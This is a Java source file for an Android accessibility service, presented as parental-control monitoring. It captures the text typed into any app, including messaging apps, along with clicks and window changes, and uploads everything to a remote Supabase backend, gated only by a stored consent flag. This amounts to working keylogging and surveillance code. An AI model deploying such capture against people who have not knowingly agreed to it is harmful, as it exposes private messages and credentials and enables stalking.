package com.parentalcontrol.monitor;

import android.accessibilityservice.AccessibilityService;
import android.content.SharedPreferences;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import org.json.JSONObject;

public class AccessibilityMonitorService extends AccessibilityService {
    
    private static final String TAG = "AccessibilityMonitor";
    private SupabaseClient supabaseClient;
    private String deviceId;
    private KeyboardMonitor keyboardMonitor;
    
    @Override
    public void onCreate() {
        super.onCreate();
        supabaseClient = new SupabaseClient(this);
        deviceId = DeviceUtils.getDeviceId(this);
        keyboardMonitor = new KeyboardMonitor(this);
        Log.i(TAG, "Accessibility monitor service created");
    }
    
    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        // Check if consent is granted
        SharedPreferences prefs = getSharedPreferences("ParentalControl", MODE_PRIVATE);
        boolean consentGranted = prefs.getBoolean("consent_granted", false);
        
        if (!consentGranted) {
            return;
        }
        
        try {
            int eventType = event.getEventType();
            String packageName = event.getPackageName() != null ? event.getPackageName().toString() : "";
            String className = event.getClassName() != null ? event.getClassName().toString() : "";
            
            // Monitor different types of events
            switch (eventType) {
                case AccessibilityEvent.TYPE_VIEW_CLICKED:
                    logClickEvent(event, packageName, className);
                    break;
                    
                case AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED:
                    logTextInputEvent(event, packageName, className);
                    keyboardMonitor.processTextInputEvent(event);
                    break;
                    
                case AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED:
                    logWindowChangeEvent(event, packageName, className);
                    break;
                    
                case AccessibilityEvent.TYPE_VIEW_SCROLLED:
                    logScrollEvent(event, packageName, className);
                    break;
            }
            
        } catch (Exception e) {
            Log.e(TAG, "Error processing accessibility event", e);
        }
    }
    
    private void logClickEvent(AccessibilityEvent event, String packageName, String className) {
        try {
            JSONObject activityData = new JSONObject();
            activityData.put("eventType", "click");
            activityData.put("packageName", packageName);
            activityData.put("appName", getAppName(packageName));
            activityData.put("className", className);
            activityData.put("timestamp", System.currentTimeMillis());
            
            // Try to get button text or content description
            if (event.getText() != null && !event.getText().isEmpty()) {
                activityData.put("text", event.getText().toString());
            }
            
            if (event.getContentDescription() != null) {
                activityData.put("description", event.getContentDescription().toString());
            }
            
            Log.d(TAG, "Screen interaction click - App: " + packageName);
            
            supabaseClient.logActivity(deviceId, "screen_interaction", activityData, new SupabaseClient.ApiCallback() {
                @Override
                public void onSuccess(String response) {
                    Log.d(TAG, "✓ Click event logged for: " + packageName);
                }
                
                @Override
                public void onError(String error) {
                    Log.e(TAG, "✗ Failed to log click event: " + error);
                }
            });
            
        } catch (Exception e) {
            Log.e(TAG, "Error logging click event", e);
        }
    }
    
    private void logTextInputEvent(AccessibilityEvent event, String packageName, String className) {
        try {
            // Log text input with app details for screen interaction tracking
            JSONObject activityData = new JSONObject();
            activityData.put("eventType", "text_input");
            activityData.put("packageName", packageName);
            activityData.put("appName", getAppName(packageName));
            activityData.put("className", className);
            activityData.put("timestamp", System.currentTimeMillis());
            
            // Get the actual text that was entered
            String inputText = "";
            if (event.getText() != null && !event.getText().isEmpty()) {
                StringBuilder sb = new StringBuilder();
                for (CharSequence cs : event.getText()) {
                    if (cs != null) {
                        sb.append(cs);
                    }
                }
                inputText = sb.toString();
            }
            
            // Log text length and actual text for screen interactions
            activityData.put("textLength", inputText.length());
            if (!inputText.isEmpty()) {
                activityData.put("inputText", inputText);
            }
            
            // Add field context if available
            AccessibilityNodeInfo source = event.getSource();
            if (source != null) {
                if (source.getHintText() != null) {
                    activityData.put("hint", source.getHintText().toString());
                }
                if (source.getContentDescription() != null) {
                    activityData.put("contentDescription", source.getContentDescription().toString());
                }
                source.recycle();
            }
            
            Log.d(TAG, "Screen interaction text input - App: " + packageName + ", Text length: " + inputText.length());
            
            supabaseClient.logActivity(deviceId, "screen_interaction", activityData, new SupabaseClient.ApiCallback() {
                @Override
                public void onSuccess(String response) {
                    Log.d(TAG, "✓ Screen interaction text input logged for: " + packageName);
                }
                
                @Override
                public void onError(String error) {
                    Log.e(TAG, "✗ Failed to log screen interaction text input: " + error);
                }
            });
            
        } catch (Exception e) {
            Log.e(TAG, "Error logging text input event", e);
        }
    }
    
    private void logWindowChangeEvent(AccessibilityEvent event, String packageName, String className) {
        try {
            JSONObject activityData = new JSONObject();
            activityData.put("eventType", "window_change");
            activityData.put("packageName", packageName);
            activityData.put("appName", getAppName(packageName));
            activityData.put("className", className);
            activityData.put("timestamp", System.currentTimeMillis());
            
            Log.d(TAG, "Screen interaction window change - App: " + packageName);
            
            supabaseClient.logActivity(deviceId, "screen_interaction", activityData, new SupabaseClient.ApiCallback() {
                @Override
                public void onSuccess(String response) {
                    Log.d(TAG, "✓ Window change event logged for: " + packageName);
                }
                
                @Override
                public void onError(String error) {
                    Log.e(TAG, "✗ Failed to log window change event: " + error);
                }
            });
            
        } catch (Exception e) {
            Log.e(TAG, "Error logging window change event", e);
        }
    }
    
    private void logScrollEvent(AccessibilityEvent event, String packageName, String className) {
        try {
            JSONObject activityData = new JSONObject();
            activityData.put("eventType", "scroll");
            activityData.put("packageName", packageName);
            activityData.put("appName", getAppName(packageName));
            activityData.put("className", className);
            activityData.put("timestamp", System.currentTimeMillis());
            activityData.put("scrollX", event.getScrollX());
            activityData.put("scrollY", event.getScrollY());
            
            supabaseClient.logActivity(deviceId, "screen_interaction", activityData, new SupabaseClient.ApiCallback() {
                @Override
                public void onSuccess(String response) {
                    Log.d(TAG, "Scroll event logged for: " + packageName);
                }
                
                @Override
                public void onError(String error) {
                    Log.e(TAG, "Failed to log scroll event: " + error);
                }
            });
            
        } catch (Exception e) {
            Log.e(TAG, "Error logging scroll event", e);
        }
    }
    
    private String getAppName(String packageName) {
        if (packageName == null || packageName.isEmpty()) return "Unknown";
        if (packageName.contains("whatsapp")) return "WhatsApp";
        if (packageName.contains("facebook")) return "Facebook";
        if (packageName.contains("instagram")) return "Instagram";
        if (packageName.contains("snapchat")) return "Snapchat";
        if (packageName.contains("twitter")) return "Twitter";
        if (packageName.contains("tiktok")) return "TikTok";
        if (packageName.contains("telegram")) return "Telegram";
        if (packageName.contains("viber")) return "Viber";
        if (packageName.contains("skype")) return "Skype";
        if (packageName.contains("discord")) return "Discord";
        if (packageName.contains("chrome")) return "Chrome";
        if (packageName.contains("firefox")) return "Firefox";
        if (packageName.contains("browser")) return "Browser";
        if (packageName.contains("mms") || packageName.contains("messaging")) return "Messages";
        if (packageName.contains("gmail")) return "Gmail";
        if (packageName.contains("youtube")) return "YouTube";
        if (packageName.contains("maps")) return "Maps";
        if (packageName.contains("photos")) return "Photos";
        if (packageName.contains("camera")) return "Camera";
        if (packageName.contains("settings")) return "Settings";
        
        // Extract app name from package name (e.g., com.example.app -> App)
        String[] parts = packageName.split("\\.");
        if (parts.length > 0) {
            String lastPart = parts[parts.length - 1];
            // Capitalize first letter
            return lastPart.substring(0, 1).toUpperCase() + lastPart.substring(1);
        }
        
        return packageName;
    }
    
    private boolean isMessagingApp(String packageName) {
        return packageName.contains("whatsapp") ||
               packageName.contains("telegram") ||
               packageName.contains("messenger") ||
               packageName.contains("sms") ||
               packageName.contains("mms") ||
               packageName.contains("messages") ||
               packageName.contains("signal") ||
               packageName.contains("viber") ||
               packageName.contains("skype") ||
               packageName.contains("discord");
    }
    
    @Override
    public void onInterrupt() {
        Log.i(TAG, "Accessibility service interrupted");
    }
    
    @Override
    public void onDestroy() {
        super.onDestroy();
        if (supabaseClient != null) {
            supabaseClient.shutdown();
        }
        if (keyboardMonitor != null) {
            keyboardMonitor.shutdown();
        }
        Log.i(TAG, "Accessibility monitor service destroyed");
    }
}